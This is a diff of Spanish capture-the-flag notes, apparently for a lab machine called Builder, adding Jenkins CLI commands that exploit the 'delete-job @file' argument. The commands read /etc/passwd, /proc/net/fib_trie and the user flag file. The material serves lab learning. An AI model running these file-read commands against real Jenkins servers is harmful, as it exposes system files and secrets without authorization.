@@ -134,6 +134,17 @@ for command in $(java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help 2>&1 
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/etc/passwd 2>&1 | grep -oP "'.*?'"
 ```
 
+- Este nos enlista las direcciones ip
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/proc/net/fib_trie 2>&1 | grep -oP "'.*?'"
+```
+
+- Para ver la ruta completa al directorio de inicio del usuario en Builder que ejecuta Jenkins
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/user.txt 2>&1 | grep -oP "'.*?'"
+```
+
+- 
 
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
 ```
